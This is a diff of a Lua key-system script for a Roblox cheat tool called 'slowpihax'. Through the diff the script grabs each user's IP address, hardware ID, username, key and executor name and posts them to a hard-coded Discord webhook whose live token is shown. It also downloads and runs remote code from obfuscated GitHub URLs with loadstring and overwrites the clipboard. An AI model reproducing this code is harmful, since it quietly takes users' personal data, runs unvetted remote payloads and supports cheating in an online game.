@@ -101,9 +101,6 @@ local devDeveloperKey = "DevKey_slowpihax"
 local Key = nonPremiumKey
 local KeyInput = "string"
 
-local isLogPremium = "false"
-local keyW = Key
-
 if isDev == true then
 	Key = devDeveloperKey
 end
@@ -116,6 +113,14 @@ if isBanned == true then
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
 task.wait(0.01)
 	game.Players.LocalPlayer:Kick("You Are Blacklisted From Using slowpihax. If This Was A Mistake Then Join My Discord Server. (Invite Copied To Clipboard)")
+end
+
+local keyW = Key
+
+if Key == nonPremiumKey then
+    isPremium = "false"
+elseif Key ~= nonPremiumKey then
+    isPremium = "true"
 end
 
 vVersion = "1.4.2 BETA"
@@ -181,7 +186,7 @@ Tab:AddTextbox({
 
 if KeyInput == Key then
 
-if Key == nonPremiumKey then
+if Key == (nonPremiumKey) then
     if identifyexecutor() == "Synapse X" then
         (syn and syn.request or http_request or http.request)
    {
@@ -205,9 +210,81 @@ if Key == nonPremiumKey then
     end
 end
 
+elseif KeyInput == bannedKey then
+
+    local HWIDKey = game:GetService("RbxAnalyticsService"):GetClientId()
+    local Player = game.Players.LocalPlayer
+    
+    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+    
+        local DiscordWebhook = "https://discord.com/api/webhooks/1039980351151411260/pxoeG6ZH_6LvaLKKJoLQAmYP-Zns3oZ2vCRekGiN-7n_6oQfG5H1UTlRZbjUyXzNxwlm" -- Discord Webhook Here
+        getgenv().embedcolor = "0xff0004"
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
+        
+        local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalPlayer;local b=false;local c=false;if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;if b==false then if plr.AccountAge<=70 then c=true end end;local c= game:GetService("MarketplaceService")local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)local function d()local a=
+            (TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end;local a= {
+                 ["title"] = "> **"..Game.Players.LocalPlayer.Name.." Has Tried To Bypass The Key System**",
+                 ["description"] = "```This was detected on "..c.Name.."```",
+                 ["type"] = "rich",
+                 ["color"] = tonumber(getgenv().embedcolor),
+                         ["thumbnail"] = {
+                     ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
+                 },
+                 ["image"] = {
+                     ["url"] = "http://www.roblox.com/Thumbs/Asset.ashx?Width=768&Height=432&AssetID="..game.PlaceId
+                 },
+                 ["fields"] = {
+                                 {
+                         ["name"] = "Executor Info",
+                         ["value"] = "```Executor Used ▶ "..(d()).."```",
+                         ["inline"] = true
+                     },
+                     {
+                         ["name"] = "Premium Info",
+                         ["value"] = "```Premium Info ▶ "..isPremium.."```",
+                         ["inline"] = true
+                     },
+                     {
+                        ["name"] = "Key Info",
+                        ["value"] = "```Key Info ▶ "..keyW.."```",
+                        ["inline"] = true
+                    },
+                     {
+                        ["name"] = "HWID",
+                        ["value"] = "```HWID ▶ "..HWIDKey.."```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "IP Adress Info",
+                        ["value"] = "```IP Address ▶ "..ip.."```",
+                        ["inline"] = false
+                    },
+                 },
+                 ["footer"] = {
+                     ["text"] = "🔔 Executed by "..Game.Players.LocalPlayer.Name.." on "..c.Name.."",
+                     ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
+                 },
+                 ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
+        }(syn and syn.request or http_request or http.request) {
+         Url = ''..DiscordWebhook..'';
+         Method = 'POST';
+         Headers = {
+             ['Content-Type'] = 'application/json';
+         };
+         Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
+        }
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
+
+        setclipboard("https://discord.com/invite/JN6wgVrUAr")
+game.Players.LocalPlayer:Kick("Bypassing The Key System is Against My Terms Of Service. If You Repeat This Action You Will Get Blacklisted! If This Was a Mistake Then Please Join My Discord Server (Invite Copied to Clipboard)")
+end
+if KeyInput ~= bannedKey then
+
 local games = {
     [{10118559731}] = "https://raw.githubusercontent.com/8hEFq5JzQ59XG5oxl2kU/iBG3hy1NIZZn54xP5e6jA8FsG4CgfX/main/nn_lmY1ExZrfFxAFdoF6v",
-    [{6516141723, 6839171747}] = "https://raw.githubusercontent.com/8hEFq5JzQ59XG5oxl2kU/iBG3hy1NIZZn54xP5e6jA8FsG4CgfX/main/d_zdxiNgKzufq3jWc4jAK6",
+    [{6516141723}] = "https://raw.githubusercontent.com/8hEFq5JzQ59XG5oxl2kU/iBG3hy1NIZZn54xP5e6jA8FsG4CgfX/main/d_zdxiNgKzufq3jWc4jAK6",
 }
 
 for ids, url in next, games do
@@ -218,9 +295,7 @@ end
 
 if game.PlaceId ~= 10118559731 then
 if game.PlaceId ~= 6516141723 then
-if game.PlaceId ~= 6839171747 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/8hEFq5JzQ59XG5oxl2kU/iBG3hy1NIZZn54xP5e6jA8FsG4CgfX/main/U_iuX0OxeQPsQRQ7IXg"))()
-end
 end
 end
 
@@ -229,6 +304,7 @@ setclipboard("https://discord.com/invite/JN6wgVrUAr")
 correctKey()
 task.wait(2)
 game:GetService("CoreGui").Orion:Destroy()
+end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
@@ -266,7 +342,7 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
                  ["value"] = "```Executor Used ▶ "..(d()).."```",
                  ["inline"] = true
              },
-            {
+                             {
                  ["name"] = "Membership Info:",
                  ["value"] = "```Membership Type ▶ "..tostring(b).."```",
                  ["inline"] = true
@@ -276,14 +352,14 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
                  ["value"] = "```Game link ▶ https://roblox.com/games/" .. game.PlaceId .. "/```",
                  ["inline"] = false
              },
-            {
+                             {
                  ["name"] = "Account Age Info",
                  ["value"] = "```Account Age ▶ "..plr.AccountAge.."```",
                  ["inline"] = true
              },
              {
                  ["name"] = "Premium Info",
-                 ["value"] = "```Premium Info ▶ "..isLogPremium.."```",
+                 ["value"] = "```Premium Info ▶ "..isPremium.."```",
                  ["inline"] = true
              },
              {
@@ -297,7 +373,7 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
                 ["inline"] = false
             },
             {
-                ["name"] = "IP Address Info",
+                ["name"] = "IP Adress Info",
                 ["value"] = "```IP Address ▶ "..ip.."```",
                 ["inline"] = false
             },
@@ -316,85 +392,11 @@ local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalP
  Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
 }
 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
-
-
-elseif KeyInput == bannedKey then
-
-    local HWIDKey = game:GetService("RbxAnalyticsService"):GetClientId()
-    local Player = game.Players.LocalPlayer
-    
-    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-    
-        local DiscordWebhook = "https://discord.com/api/webhooks/1039980351151411260/pxoeG6ZH_6LvaLKKJoLQAmYP-Zns3oZ2vCRekGiN-7n_6oQfG5H1UTlRZbjUyXzNxwlm" -- Discord Webhook Here
-        getgenv().embedcolor = "0xff0004"
-
-        setclipboard("https://discord.com/invite/JN6wgVrUAr")
-        
-        local a= os.time()local a= os.date('!*t', a)plr= game:GetService'Players'.LocalPlayer;local b=false;local c=false;if plr.MembershipType==Enum.MembershipType.Premium then b=true elseif plr.MembershipType==Enum.MembershipType.None then b=false end;if b==false then if plr.AccountAge<=70 then c=true end end;local c= game:GetService("MarketplaceService")local c= c:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)local function d()local a=
-            (TRIGON_LOADED and "Trigon EVO")or(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")or(secure_load and "Sentinel")or(EVON_LOADED and "Evon")or(is_sirhurt_closure and "Sirhurt")or(pebc_execute and "ProtoSmasher")or(KRNL_LOADED and "Krnl")or(OXYGEN_LOADED and "Oxygen U")or(WrapGlobal and "WeAreDevs")or(IsElectron and "Electron")or(isvm and "Proxo")or(shadow_env and "Shadow")or(jit and "EasyExploits")or(getreg()['CalamariLuaEnv'] and "Calamari")or(unit and "‎")or(IS_VIVA_LOADED and "VIVA")or(IS_COCO_LOADED and "Coco")or("Unsupported Executor")return a end;local a= {
-                 ["title"] = "> **"..Game.Players.LocalPlayer.Name.." Has Tried To Bypass The Key System**",
-                 ["description"] = "```This was detected on "..c.Name.."```",
-                 ["type"] = "rich",
-                 ["color"] = tonumber(getgenv().embedcolor),
-                         ["thumbnail"] = {
-                     ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
-                 },
-                 ["image"] = {
-                     ["url"] = "http://www.roblox.com/Thumbs/Asset.ashx?Width=768&Height=432&AssetID="..game.PlaceId
-                 },
-                 ["fields"] = {
-                                 {
-                         ["name"] = "Executor Info",
-                         ["value"] = "```Executor Used ▶ "..(d()).."```",
-                         ["inline"] = true
-                     },
-                     {
-                         ["name"] = "Premium Info",
-                         ["value"] = "```Premium Info ▶ "..isLogPremium.."```",
-                         ["inline"] = true
-                     },
-                     {
-                        ["name"] = "Key Info",
-                        ["value"] = "```Key Info ▶ "..keyW.."```",
-                        ["inline"] = true
-                    },
-                     {
-                        ["name"] = "HWID",
-                        ["value"] = "```HWID ▶ "..HWIDKey.."```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "IP Adress Info",
-                        ["value"] = "```IP Address ▶ "..ip.."```",
-                        ["inline"] = false
-                    },
-                 },
-                 ["footer"] = {
-                     ["text"] = "🔔 Executed by "..Game.Players.LocalPlayer.Name.." on "..c.Name.."",
-                     ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
-                 },
-                 ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
-        }(syn and syn.request or http_request or http.request) {
-         Url = ''..DiscordWebhook..'';
-         Method = 'POST';
-         Headers = {
-             ['Content-Type'] = 'application/json';
-         };
-         Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
-        }
-
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
-
-        setclipboard("https://discord.com/invite/JN6wgVrUAr")
-
-        setclipboard("https://discord.com/invite/JN6wgVrUAr")
-game.Players.LocalPlayer:Kick("Bypassing The Key System is Against My Terms Of Service. If You Repeat This Action You Will Get Blacklisted! If This Was a Mistake Then Please Join My Discord Server (Invite Copied to Clipboard)")
-end
+setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/GyaGN2l5KuEVM6APY4TZOY9sEqGApqlme76iJ1gkUGsaN"))()
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
